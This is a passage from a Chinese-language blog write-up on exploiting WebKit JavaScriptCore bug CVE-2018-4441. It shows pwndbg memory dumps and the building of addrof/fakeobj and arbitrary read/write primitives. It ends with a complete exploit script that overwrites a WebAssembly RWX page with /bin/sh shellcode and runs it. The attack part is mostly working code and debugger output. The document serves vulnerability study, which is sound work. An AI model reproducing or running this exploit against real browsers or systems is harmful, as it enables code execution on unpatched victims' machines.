0x00007fe0000e0018</span><br><span class="line">0x7fffb30c8370:	0x00007fe8000ff000	0x0000000200000002</span><br><span class="line">0x7fffb30c8380:	0x0100160000000140	0x0000000000000000</span><br><span class="line">0x7fffb30c8390:	0x0001000000001337	0x00007fffb1c551f0</span><br><span class="line">0x7fffb30c83a0:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fffb30c83b0:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x00007fe0000e0008-0x40</span><br><span class="line">0x7fe0000dffc8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe0000dffd8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe0000dffe8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe0000dfff8:	0x00000000badbeef0	0x00007ffff3a8a600</span><br><span class="line">0x7fe0000e0008:	0x00000000badbeef0	0x00007ffff3a8a600</span><br><span class="line">0x7fe0000e0018:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fe0000e0028:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fe0000e0038:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fe0000e0048:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fe0000e0058:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x00007fe8000ff000-0x10</span><br><span class="line">0x7fe8000feff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe8000ff000:	0x0000000000001337	0x0000000000000000</span><br><span class="line">0x7fe8000ff010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe8000ff020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fe8000ff030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>而且经过调试可以发现container中保存exp中jscell位置的值比i32中高8位的值大0x10000，所以exp中i32高8位-0x10000。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] container:</span><br><span class="line">--&gt; Object: 0x7fffb30c8380 with butterfly (nil) (Structure 0x7fffb3070e70:[Object, &#123;jscell:0, butterfly:1&#125;, NonArray, Proto:0x7fffb30b4000, Leaf]), StructureID: 320</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x7fffb30c8380</span><br><span class="line">0x7fffb30c8380:	0x0100160000000140	0x0000000000000000</span><br><span class="line">0x7fffb30c8390:	0x0001000000001337	0x00007fffb1c551f0</span><br><span class="line">0x7fffb30c83a0:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fffb30c83b0:	0x00000000badbeef0	0x00000000badbeef0</span><br><span class="line">0x7fffb30c83c0:	0x00000000badbeef0	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    关于i32和f64使用相同内存存储，在JSArrayBufferView.h中有解释WastefulTypedArray类型的存储，WastefulTypedArray类型的butterfly并不包含vector。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; A typed array that was used in some crazy way. B&#39;s IndexingHeader</span><br><span class="line">&#x2F;&#x2F; is hijacked to contain a reference to the native array buffer. The</span><br><span class="line">&#x2F;&#x2F; native typed array view points back to the JS view. V points to a</span><br><span class="line">&#x2F;&#x2F; vector allocated using who-knows-what, and M &#x3D; WastefulTypedArray.</span><br><span class="line">&#x2F;&#x2F; The view does not own the vector.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(JSC::JSArrayBufferView*)0x7fffb30c8340</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">......</span><br><span class="line">  m_vector &#x3D; &#123;</span><br><span class="line">    static kind &#x3D; Gigacage::Primitive, </span><br><span class="line">    m_barrier &#x3D; &#123;</span><br><span class="line">      m_value &#x3D; &#123;</span><br><span class="line">        static kind &#x3D; Gigacage::Primitive, </span><br><span class="line">        m_ptr &#x3D; 0x7fe8000ff000</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  m_length &#x3D; 1, </span><br><span class="line">  m_mode &#x3D; JSC::TypedArrayMode::WastefulTypedArray</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="arbitrary-read-write"><a href="#arbitrary-read-write" class="headerlink" title="arbitrary read/write"></a>arbitrary read/write</h5><p>​    这样构造的container如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] container: </span><br><span class="line">--&gt; Object: 0x7fffb30c8380 with butterfly (nil) (Structure 0x7fffb3070e70:[Object, &#123;jscell:0, butterfly:1&#125;, NonArray, Proto:0x7fffb30b4000, Leaf]), StructureID: 320</span><br><span class="line">[*] victim:</span><br><span class="line">--&gt; Object: 0x7fffb1a551f0 with butterfly 0x7ff000280058 (Structure 0x7fffb3070d90:[Array, &#123;prop:100, prop1:101&#125;, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 318</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;6xg 0x7fffb30c8380</span><br><span class="line">0x7fffb30c8380:	0x0100160000000140	0x0000000000000000</span><br><span class="line">0x7fffb30c8390:	0x0108210700000064	0x00007fffb1a551f0</span><br><span class="line">0x7fffb30c83a0:	0x00000000badbeef0	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>即*(dword*)(container+0x10)的位置为伪造的ArrayWithArrayStorage类型数组，fakeobj(container+0x10)构造butterfly为victim的fakeobj记hax。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] hax: </span><br><span class="line">--&gt; Object: 0x7fffb30c8390 with butterfly 0x7fffb1a551f0 (Structure 0x7fffb30f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100</span><br></pre></td></tr></table></figure>

<p>​    这时内存的存储结构为hax.butterfly-&gt;victim，其中ArrayWithArrayStorage类型的数据直接存放在butterfly里，hax的butterfly可以通过hax[1]访问修改，victim.prop也可以修改，由于ArrayWithDouble类型数据的prop存放在*(dword*)(butterfly-0x10)的位置，我们修改hax.butterfly为addr+0x10即可实现addr处的任意地址读写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  read64: function(addr)&#123;</span><br><span class="line">      hax[1] &#x3D; i2f(addr + 0x10);</span><br><span class="line">return addrof(victim.prop);</span><br><span class="line">  &#125;,</span><br><span class="line">  write64: function(addr,data)&#123;</span><br><span class="line">      hax[1] &#x3D; i2f(addr+0x10);</span><br><span class="line">victim.prop &#x3D; fakeobj(data);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里的addrof和fakeobj的作用实际上是读写相应位置的数和进制转换。</p>
<p>​    有了任意地址读写的原语我们就可以通过覆盖wasm的rwx内存执行shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      var wasm_code &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">      var wasm_mod &#x3D; new WebAssembly.Module(wasm_code);</span><br><span class="line">      var wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);</span><br><span class="line">      var f &#x3D; wasm_instance.exports.main;</span><br><span class="line">addr_f &#x3D; addrof(f);</span><br><span class="line">      var addr_p &#x3D; this.read64(addr_f + 0x40);</span><br><span class="line">var addr_shellcode &#x3D; this.read64(addr_p);</span><br><span class="line">      print(&quot;0x&quot;+addr_f.toString(16))</span><br><span class="line">      print(&quot;0x&quot;+addr_p.toString(16))</span><br><span class="line">      print(&quot;0x&quot;+addr_shellcode.toString(16));</span><br><span class="line">      shellcode &#x3D; &quot;j;X\x99RH\xbb&#x2F;&#x2F;bin&#x2F;shST_RWT^\x0f\x05&quot;</span><br><span class="line">      this.write(addr_shellcode, shellcode);</span><br></pre></td></tr></table></figure>

<p>这里的wasm_code作用是调用wasm模块生成一个用于保存机器码的rwx的页，内容并不重要。js引擎实现wasm的方法一般是先用汇编初始化wasm模块，然后跳转到rwx的页面执行真正用户调用的内容；js引擎在执行用户调用的wasm时需要找到保存这段字节码的页面，rwx的页面地址会或隐式或显示地保存在内存里，我们只需要调试找到rwx页面的地址并覆盖其内容即可。</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>​    这里的exp较lokihardt的原版有修改，去掉了lokihardt利用unboxed2和boxed2指向相同内存构造第二个fakeobj和addrof原语的部分（作者认为这一部分或许是lokihardt为了显示OOB这类漏洞的另一种通用构造fakeobj、addrof原语的方法，但是并不是必要的，去掉更容易理解而且并不影响exp的稳定性）</p>
<p>lokihardt的原exp：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rtfingc/cve-repo/blob/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage/exp.js">https://github.com/rtfingc/cve-repo/blob/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage/exp.js</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">var conversion_buffer &#x3D; new ArrayBuffer(8)</span><br><span class="line">var f64 &#x3D; new Float64Array(conversion_buffer)</span><br><span class="line">var i32 &#x3D; new Uint32Array(conversion_buffer)</span><br><span class="line"></span><br><span class="line">var BASE32 &#x3D; 0x100000000</span><br><span class="line">function f2i(f) &#123;</span><br><span class="line">    f64[0] &#x3D; f</span><br><span class="line">    return i32[0] + BASE32 * i32[1]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f(i) &#123;</span><br><span class="line">    i32[0] &#x3D; i % BASE32</span><br><span class="line">    i32[1] &#x3D; i &#x2F; BASE32</span><br><span class="line">    return f64[0]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function user_gc() &#123;</span><br><span class="line">    for (let i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">        let ab &#x3D; new ArrayBuffer(1024 * 1024 * 10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let arr &#x3D; [1];</span><br><span class="line"></span><br><span class="line">arr.length &#x3D; 0x100000;</span><br><span class="line">arr.splice(0, 0x11);</span><br><span class="line">arr.length &#x3D; 0xfffffff0;</span><br><span class="line"></span><br><span class="line">let spray &#x3D; new Array(0x3000);</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; 0x3000; i +&#x3D; 2) &#123;</span><br><span class="line">    spray[i]   &#x3D; [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];</span><br><span class="line">    spray[i+1] &#x3D; [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; 0x3000; i +&#x3D; 2)</span><br><span class="line">    spray[i][0] &#x3D; i2f(0x1337)</span><br><span class="line"></span><br><span class="line">arr.splice(0x1000,0,1);</span><br><span class="line"></span><br><span class="line">fake_index&#x3D;-1;</span><br><span class="line">for(let i&#x3D;0;i&lt;0x3000;i+&#x3D;2)&#123;</span><br><span class="line">    if(spray[i].length!&#x3D;10)&#123;</span><br><span class="line">        print(&quot;hit: &quot;+i.toString(16));</span><br><span class="line">        fake_index&#x3D;i;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unboxed &#x3D; spray[fake_index];</span><br><span class="line">boxed &#x3D; spray[fake_index+1];</span><br><span class="line"></span><br><span class="line">function addrof(obj)&#123;</span><br><span class="line">    boxed[0] &#x3D; obj;</span><br><span class="line">    return f2i(unboxed[14]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeobj(addr)&#123;</span><br><span class="line">    unboxed[14] &#x3D; i2f(addr);</span><br><span class="line">    return boxed[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">victim &#x3D; [1.1];</span><br><span class="line">victim[0] &#x3D;3.3;;</span><br><span class="line">victim[&#39;prop&#39;] &#x3D; 13.37;</span><br><span class="line">victim[&#39;prop&#39;+1] &#x3D; 13.37;</span><br><span class="line"></span><br><span class="line">i32[0]&#x3D;100;</span><br><span class="line">i32[1]&#x3D;0x01082107 - 0x10000;</span><br><span class="line">var container&#x3D;&#123;</span><br><span class="line">    jscell:f64[0],</span><br><span class="line">    butterfly:victim,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container_addr &#x3D; addrof(container);</span><br><span class="line">hax &#x3D; fakeobj(container_addr+0x10);</span><br><span class="line"></span><br><span class="line">var stage2&#x3D;&#123;</span><br><span class="line">    read64: function(addr)&#123;</span><br><span class="line">        hax[1] &#x3D; i2f(addr + 0x10);</span><br><span class="line">        return addrof(victim.prop);</span><br><span class="line">    &#125;,</span><br><span class="line">    write64: function(addr,data)&#123;</span><br><span class="line">        hax[1] &#x3D; i2f(addr+0x10);</span><br><span class="line">        victim.prop &#x3D; fakeobj(data);</span><br><span class="line">    &#125;,</span><br><span class="line">    write: function(addr, shellcode) &#123;</span><br><span class="line">        var theAddr &#x3D; addr;</span><br><span class="line">        for(var i&#x3D;0;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">            this.write64(addr+i,shellcode[i].charCodeAt())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    pwn: function()&#123;</span><br><span class="line">        var wasm_code &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">        var wasm_mod &#x3D; new WebAssembly.Module(wasm_code);</span><br><span class="line">        var wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);</span><br><span class="line">        var f &#x3D; wasm_instance.exports.main;</span><br><span class="line">        addr_f &#x3D; addrof(f);</span><br><span class="line">        var addr_p &#x3D; this.read64(addr_f + 0x40);</span><br><span class="line">        var addr_shellcode &#x3D; this.read64(addr_p);</span><br><span class="line">        print(&quot;0x&quot;+addr_f.toString(16))</span><br><span class="line">        print(&quot;0x&quot;+addr_p.toString(16))</span><br><span class="line">        print(&quot;0x&quot;+addr_shellcode.toString(16));</span><br><span class="line">        shellcode &#x3D; &quot;j;X\x99RH\xbb&#x2F;&#x2F;bin&#x2F;shST_RWT^\x0f\x05&quot;</span><br><span class="line">        this.write(addr_shellcode, shellcode);</span><br><span class="line">        f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage2.pwn()</span><br></pre></td></tr></table></figure>

<p><img src="pwned.png" alt="pwned"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>saelo的jsc利用知识</p>
<p><a target="_blank" rel="noopener" href="http://phrack.org/papers/attacking_javascript_engines.html">http://phrack.org/papers/attacking_javascript_engines.html</a></p>
<p>js引擎的shape和inline cache</p>
<p><a target="_blank" rel="noopener" href="https://mathiasbynens.be/notes/shapes-ics">https://mathiasbynens.be/notes/shapes-ics</a></p>
<p>lokihardt提交的漏洞</p>
<p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1685">https://bugs.chromium.org/p/project-zero/issues/detail?id=1685</a></p>
<p>lokihardt的exp</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rtfingc/cve-repo/blob/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage/exp.js">https://github.com/rtfingc/cve-repo/blob/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage/exp.js</a></p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>